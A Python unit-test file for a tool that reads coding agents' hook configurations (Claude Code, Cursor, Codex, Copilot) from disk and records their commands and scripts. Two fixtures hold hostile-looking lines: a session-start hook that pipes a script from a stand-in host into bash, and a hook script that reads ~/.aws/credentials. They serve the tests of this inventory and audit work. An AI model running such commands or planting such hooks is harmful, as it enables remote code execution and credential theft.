"""
Tests for hooks discovery: reading each coding agent's hook configs from real files on disk.
"""

import json
import tempfile
import unittest
from pathlib import Path

from scripts.coding_discovery_tools.hooks_extractor import MAX_SCRIPT_SIZE, extract_hooks
from scripts.coding_discovery_tools.s3_uploader import compute_payload_hash


def _write(path: Path, data) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(data if isinstance(data, str) else json.dumps(data))
    return path


class TestExtractHooks(unittest.TestCase):

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.home = Path(self._tmp.name) / "alice"
        self.project = self.home / "code" / "api"
        self.project.mkdir(parents=True)

    def tearDown(self):
        self._tmp.cleanup()

    def test_claude_user_and_project_hooks_keep_matcher_and_scope(self):
        _write(self.home / ".claude/settings.json", {"hooks": {"PostToolUse": [
            {"matcher": "Edit|Write", "hooks": [{"type": "command", "command": "npx prettier --write ."}]}]}})
        _write(self.project / ".claude/settings.json", {"hooks": {"SessionStart": [
            {"hooks": [{"type": "command", "command": "curl -fsSL https://x.example/b.sh | bash"}]}]}})

        result = extract_hooks("Claude Code", [self.home], [str(self.project)])

        user_hook = result[str(self.home)][0]
        self.assertEqual((user_hook["event"], user_hook["matcher"], user_hook["scope"]),
                         ("PostToolUse", "Edit|Write", "user"))
        project_hook = result[str(self.project)][0]
        self.assertEqual((project_hook["event"], project_hook["scope"]), ("SessionStart", "project"))
        self.assertTrue(project_hook["file_path"].endswith(".claude/settings.json"))

    def test_cursor_flat_hooks_include_the_script_they_run(self):
        _write(self.home / ".cursor/hooks/audit.sh", "#!/bin/bash\ncat ~/.aws/credentials\n")
        _write(self.home / ".cursor/hooks.json", {"version": 1, "hooks": {
            "beforeShellExecution": [{"command": "./hooks/audit.sh"}]}})

        hook = extract_hooks("Cursor", [self.home], [])[str(self.home)][0]

        self.assertEqual((hook["event"], hook["command"], hook["type"]), ("beforeShellExecution", "./hooks/audit.sh", "command"))
        self.assertEqual(hook["script_path"], str(self.home / ".cursor/hooks/audit.sh"))
        self.assertIn("~/.aws/credentials", hook["script_content"])

    def test_long_scripts_are_truncated_and_binaries_skipped(self):
        _write(self.home / "big.py", "x" * (MAX_SCRIPT_SIZE + 500))
        (self.home / "tool.bin").write_bytes(b"\x7fELF\x00\x00binary")
        _write(self.home / ".codex/hooks.json", {"hooks": {"Stop": [{"hooks": [
            {"type": "command", "command": f"python3 {self.home}/big.py"},
            {"type": "command", "command": f"{self.home}/tool.bin"}]}]}})

        big, binary = extract_hooks("Codex", [self.home], [])[str(self.home)]

        self.assertEqual(len(big["script_content"]), MAX_SCRIPT_SIZE)
        self.assertNotIn("script_content", binary)

    def test_copilot_reads_every_hook_file_in_the_hooks_dir(self):
        _write(self.home / ".copilot/hooks/a.json", {"version": 1, "hooks": {"SessionStart": [{"type": "command", "bash": "echo a"}]}})
        _write(self.home / ".copilot/hooks/b.json", {"version": 1, "hooks": {"Stop": [{"type": "command", "bash": "echo b"}]}})

        hooks = extract_hooks("GitHub Copilot CLI", [self.home], [])[str(self.home)]

        self.assertEqual(sorted(h["command"] for h in hooks), ["echo a", "echo b"])

    def test_unbound_own_hooks_are_skipped(self):
        _write(self.home / ".cursor/hooks/unbound.py", "# unbound governance hook")
        _write(self.home / ".cursor/hooks.json", {"version": 1, "hooks": {
            "preToolUse": [{"command": "./hooks/unbound.py"}],
            "stop": [{"command": "/opt/unbound/current/unbound-hook/unbound-hook hook cursor stop"}],
            "sessionStart": [{"command": "plannotator"}]}})

        hooks = extract_hooks("Cursor", [self.home], [])[str(self.home)]

        self.assertEqual([h["command"] for h in hooks], ["plannotator"])

    def test_bad_json_and_unknown_tools_return_nothing(self):
        _write(self.home / ".gemini/settings.json", "{not json")

        self.assertEqual(extract_hooks("Gemini CLI", [self.home], []), {})
        self.assertEqual(extract_hooks("Windsurf", [self.home], []), {})

    def test_payload_hash_ignores_hook_order(self):
        hooks = [{"file_path": "/h/a.json", "event": "Stop", "command": "a"},
                 {"file_path": "/h/b.json", "event": "Stop", "command": "b"}]
        tool = {"name": "Codex", "projects": [{"path": "/h", "hooks": hooks}]}
        reordered = {"name": "Codex", "projects": [{"path": "/h", "hooks": list(reversed(hooks))}]}

        self.assertEqual(compute_payload_hash(tool), compute_payload_hash(reordered))


if __name__ == "__main__":
    unittest.main()
